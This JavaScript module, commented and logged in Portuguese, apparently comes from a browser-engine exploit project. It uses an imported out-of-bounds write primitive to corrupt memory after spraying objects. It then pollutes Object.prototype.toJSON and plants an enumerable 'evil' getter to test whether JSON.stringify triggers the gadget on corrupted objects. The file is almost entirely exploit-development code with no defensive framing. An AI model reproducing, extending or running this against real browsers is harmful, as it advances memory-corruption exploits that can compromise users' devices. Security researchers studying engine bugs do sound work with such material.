// js/script3/testForInGadgetExploration.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const GADGET_PROPERTY_NAME = "AAAA_GdgT_Repro"; // Nome para este teste
let getter_called_flag = false;
let last_getter_this_id = null;
let last_getter_this_marker_before = null;
let last_getter_this_marker_after = null;
let getter_this_details_log = "";

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.anotherProperty = "clean";
        this.propA = "valA"; // Adicionando mais propriedades como no teste de sucesso anterior
        this.propB = 23456;
        this.propC = null;
    }
}

// toJSON que tentará acionar o getter via for...in
// Esta versão tenta ser próxima à que acionou o getter no log [13:29:30]
export function toJSON_TriggerForInGadget_Repro() {
    const FNAME_toJSON = "toJSON_TriggerForInGadget_Repro";
    // console.log(`[${FNAME_toJSON}] Entrando. this.id: ${this && typeof this.id !== 'undefined' ? this.id : 'N/A'}`);
    let returned_payload = {
        _variant_: FNAME_toJSON,
        _id_at_entry_: (this && this.id !== undefined ? String(this.id) : "N/A"),
    };
    let iteration_count = 0;
    try {
        for (const prop in this) {
            iteration_count++;
            // A principal forma de acionar o getter é JSON.stringify tentando ler 'prop'
            // quando 'prop' é o nome do nosso getter enumerável.
            // Apenas para garantir que as propriedades sejam acessadas, vamos adicioná-las ao payload
            // se não forem o próprio getter (para evitar recursão se o getter retornar this).
            if (prop !== GADGET_PROPERTY_NAME && Object.prototype.hasOwnProperty.call(this, prop) && typeof this[prop] !== 'function') {
                returned_payload[prop] = this[prop];
            }
            if (iteration_count > 100) { // Safety break
                logS3(`[${FNAME_toJSON}] Loop excedeu 100 iterações. ID: ${this.id}`, "warn", FNAME_toJSON);
                returned_payload._LOOP_BREAK_ = iteration_count;
                break;
            }
        }
    } catch (e) {
        logS3(`[${FNAME_toJSON}] ERRO no loop for...in: ${e.name} - ${e.message}`, "error", FNAME_toJSON);
        returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`;
    }
    returned_payload._iterations_ = iteration_count;
    // console.log(`[${FNAME_toJSON}] Saindo. Iterações: ${iteration_count}`);
    return returned_payload;
}

export async function executeForInGadgetReproTest() {
    const FNAME_TEST = "executeForInGadgetReproTest";
    logS3(`--- Iniciando Teste: Tentativa de Reproduzir Acionamento do Getter ---`, "test", FNAME_TEST);
    document.title = `Reproduce Getter Trigger`;

    getter_called_flag = false;
    last_getter_this_id = null;
    last_getter_this_marker_before = null;
    last_getter_this_marker_after = null;
    getter_this_details_log = "";

    let originalGetterDescriptor = Object.getOwnPropertyDescriptor(MyComplexObject.prototype, GADGET_PROPERTY_NAME);
    let getterPollutionApplied = false;

    try {
        logS3(`Definindo getter '${GADGET_PROPERTY_NAME}' em MyComplexObject.prototype...`, 'info', FNAME_TEST);
        Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, {
            get: function() {
                const GETTER_FNAME = "EvilGetter_Repro";
                getter_called_flag = true; // Flag global
                last_getter_this_id = this.id;
                getter_this_details_log = `[${GETTER_FNAME}] Getter Chamado! this.id: ${this.id}. `;
                try {
                    getter_this_details_log += `instanceof MyComplexObject: ${this instanceof MyComplexObject}. `;
                    getter_this_details_log += `toString.call(this): ${Object.prototype.toString.call(this)}. `;

                    last_getter_this_marker_before = this.marker;
                    this.marker = 0xBADB0B0; // Tenta modificar
                    last_getter_this_marker_after = this.marker;
                    getter_this_details_log += `Marker modificado de ${toHex(last_getter_this_marker_before)} para ${toHex(last_getter_this_marker_after)}.`;

                    this.value1 = 111;
                    this.value2 = "getter_was_here";
                    this.newPropertyFromGetterRepro = "added_by_repro_getter";

                    logS3(getter_this_details_log, "vuln", GETTER_FNAME); // Loga todos os detalhes de uma vez

                } catch (e_getter_mod) {
                    const getter_err_msg = `   [${GETTER_FNAME}] ERRO ao operar em this: ${e_getter_mod.name} - ${e_getter_mod.message}`;
                    logS3(getter_err_msg, "error", GETTER_FNAME);
                    getter_this_details_log += getter_err_msg;
                }
                return "value_from_repro_getter"; // Getter precisa retornar algo
            },
            configurable: true,
            enumerable: true // Crucial
        });
        getterPollutionApplied = true;
        logS3("Getter definido.", "good", FNAME_TEST);

    } catch (e_getter_setup) {
        logS3(`ERRO ao definir o getter: ${e_getter_setup.message}`, "error", FNAME_TEST);
        return;
    }

    const spray_count = 50;
    const sprayed_objects = [];
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) { logS3(`Spray error: ${e_spray.message}`, "error", FNAME_TEST); if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME]; return; }

    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`2. Configurando OOB e escrevendo 0xFFFFFFFF em oob_ab[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) { logS3("OOB setup error", "error", FNAME_TEST); if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME]; return; }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB realizada.`, "info", FNAME_TEST);
    } catch (e_write) { logS3(`OOB write error: ${e_write.message}`, "error", FNAME_TEST); clearOOBEnvironment(); if (getterPollutionApplied) delete MyComplexObject.prototype[GADGET_PROPERTY_NAME]; return; }

    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`3. Sondando objetos com ${toJSON_TriggerForInGadget_Repro.name}...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;
    let affected_object_original_marker = null;

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_TriggerForInGadget_Repro,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;

        const objectsToProbe = Math.min(sprayed_objects.length, 10);
        logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);
        for (let i = 0; i < objectsToProbe; i++) {
            const obj = sprayed_objects[i];
            if (!obj) continue;

            getter_called_flag = false; // Reset para este objeto
            getter_this_details_log = ""; // Reset
            affected_object_original_marker = obj.marker; // Salva antes do stringify

            document.title = `Sondando Obj ${i} com ReproToJSON`;
            let stringifyResult = null;
            let errorDuringStringify = null;

            logS3(`   Testando objeto ${i} (ID: ${obj.id}). Marker Original: ${toHex(affected_object_original_marker)}`, 'info', FNAME_TEST);
            try {
                stringifyResult = JSON.stringify(obj);
                logS3(`     JSON.stringify(obj[${i}]) completou. Retorno da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
            } catch (e_str) {
                errorDuringStringify = e_str;
                logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
                if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }

            if (getter_called_flag) {
                logS3(`   !!!! SUCESSO: Getter '${GADGET_PROPERTY_NAME}' FOI CHAMADO para obj.id=${last_getter_this_id} !!!!`, "vuln", FNAME_TEST);
                logS3(`        Detalhes do Getter: ${getter_this_details_log}`, "info", FNAME_TEST);
                logS3(`        Objeto original (ID ${obj.id}) marker APÓS stringify: ${toHex(obj.marker)}`, "info", FNAME_TEST);
                if (obj.marker === 0xBADB0B0) {
                    logS3(`        CONFIRMADO: Objeto sprayed_objects[${i}] (ID: ${obj.id}) teve seu 'marker' modificado pelo getter!`, "critical", FNAME_TEST);
                }
                problem_detected = true;
                document.title = `SUCCESS: Getter Called on ${obj.id}!`;
                break;
            }
            if (errorDuringStringify) {
                logS3(`   ERRO durante sondagem de obj[${i}]: ${errorDuringStringify.name}`, "error", FNAME_TEST);
                problem_detected = true;
                document.title = `ERROR ${errorDuringStringify.name} on ${obj.id}`;
                if (errorDuringStringify.name === 'RangeError') {
                    logS3("       RangeError ocorreu. O loop for...in ainda é instável.", "warn", FNAME_TEST);
                }
                break;
            }
            await PAUSE_S3(SHORT_PAUSE_S3);
        }
    } catch (e_main_loop) {
        logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDescriptor) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDescriptor);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (getter_called_flag) {
        logS3("Teste CONCLUÍDO: O Getter FOI ACIONADO!", "vuln", FNAME_TEST);
    } else if (problem_detected) {
        logS3("Teste CONCLUÍDO: Um problema (erro) ocorreu durante a sondagem.", "warn", FNAME_TEST);
    } else {
        logS3("Teste CONCLUÍDO: Getter não acionado e nenhum erro óbvio nos objetos sondados.", "good", FNAME_TEST);
    }

    if (getterPollutionApplied) {
        if (originalGetterDescriptor) Object.defineProperty(MyComplexObject.prototype, GADGET_PROPERTY_NAME, originalGetterDescriptor);
        else delete MyComplexObject.prototype[GADGET_PROPERTY_NAME];
        logS3(`Getter '${GADGET_PROPERTY_NAME}' restaurado/removido de MyComplexObject.prototype.`, "info", FNAME_TEST);
    }

    logS3(`--- Teste Tentativa de Reproduzir Acionamento do Getter CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    document.title = getter_called_flag ? document.title : (problem_detected ? document.title : `Reproduce Getter Done`);
}
